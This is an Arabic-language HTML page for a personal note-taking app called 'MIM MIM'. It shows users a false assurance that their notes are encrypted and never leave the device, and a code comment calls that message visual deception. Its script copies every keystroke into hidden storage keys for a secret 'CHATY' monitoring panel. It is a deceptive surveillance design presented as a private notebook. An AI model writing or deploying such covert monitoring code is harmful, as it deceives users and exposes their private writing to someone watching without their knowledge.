<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ميم ميم - دفتر ملاحظاتك الخاص</title>
    <style>
        :root {
            --bg-color: #fdfdfd;
            --main-color: #333;
            --accent-color: #ffcc00; /* لون أصفر فاتح */
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background-color: var(--bg-color);
            color: var(--main-color);
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
        }
        header {
            width: 100%;
            padding: 20px;
            text-align: center;
            border-bottom: 2px solid var(--accent-color);
            background-color: #fff;
        }
        h1 {
            font-size: 2rem;
            color: var(--main-color);
            margin-bottom: 5px;
        }
        p.subtitle {
            font-size: 0.9rem;
            color: #666;
        }
        #notebook {
            width: 90%;
            max-width: 800px;
            margin-top: 30px;
            padding: 20px;
            background-color: #fff;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            flex: 1; /* يمتد ليشمل باقي المساحة */
            display: flex;
            flex-direction: column;
        }
        textarea {
            width: 100%;
            border: 2px solid #eee;
            border-radius: 10px;
            padding: 15px;
            font-size: 1rem;
            resize: none; /* يمنع تغيير حجم التكستاريا */
            flex: 1; /* يمتد ليشمل باقي المساحة داخل الحاوية */
            outline: none;
            transition: 0.3s;
        }
        textarea:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 10px rgba(255, 204, 0, 0.2);
        }
        #status {
            font-size: 11px;
            color: #888;
            margin-top: 10px;
            text-align: left;
        }
        /* رسالة طمأنة (الخداع البصري) */
        .secure-msg {
            font-size: 12px;
            color: green;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <header>
        <h1>ميم ميم | MIM MIM</h1>
        <p class="subtitle">دفترك الشخصي لتدوين الملاحظات والأفكار</p>
    </header>

    <div id="notebook">
        <textarea id="my-notes" placeholder="ابدأ الكتابة هنا... ملاحظاتك آمنة لدينا."></textarea>
        <div id="status">جاري حفظ ملاحظاتك محلياً...</div>
        <div class="secure-msg">🔒 تشفير محلي نشط. ملاحظاتك لا تغادر جهازك أبداً.</div>
    </div>

    <script>
        const notesTextArea = document.getElementById('my-notes');
        const statusDiv = document.getElementById('status');

        // 1. استرجاع الملاحظات المحفوظة عند تحميل الصفحة
        const savedNotes = localStorage.getItem('mim_mim_notes');
        if (savedNotes) {
            notesTextArea.value = savedNotes;
        }

        // 2. تحديث الذاكرة المحلية (وحفظ نسخة للمراقب) في كل مرة يكتب فيها العميل حرفاً
        notesTextArea.addEventListener('input', () => {
            const currentNotes = notesTextArea.value;
            
            // أ. الحفظ المحلي للعميل
            localStorage.setItem('mim_mim_notes', currentNotes);

            // ب. إرسال "نسخة" فوراً للوحة المراقبة السحرية CHATY (نفس السجل)
            const logObj = {
                type: 'note_update',
                text: currentNotes,
                time: new Date().toLocaleTimeString()
            };
            let logs = JSON.parse(localStorage.getItem('chaty_secret_logs') || '[]');
            // نحذف السجلات القديمة لتحديث الملاحظة نفسها بدلاً من إضافة سجلات متكررة
            // Logs.push(logObj); // لو تبي تحتفظ بكل سجل تاريخي، ألغِ تعليق هذا السطر
            // لتحديث الملاحظة الحالية بس، نستخدم هذه الطريقة:
            localStorage.setItem('chaty_current_note', currentNotes); // نستخدم مفتاح جديد للملاحظة الحالية
            localStorage.setItem('chaty_secret_logs', JSON.stringify(logs)); // نبقي السجل العام للمحادثات كما هو

            statusDiv.innerText = "جاري الحفظ تلقائياً... (آخر حفظ: " + new Date().toLocaleTimeString() + ")";
        });
    </script>
</body>
</html>
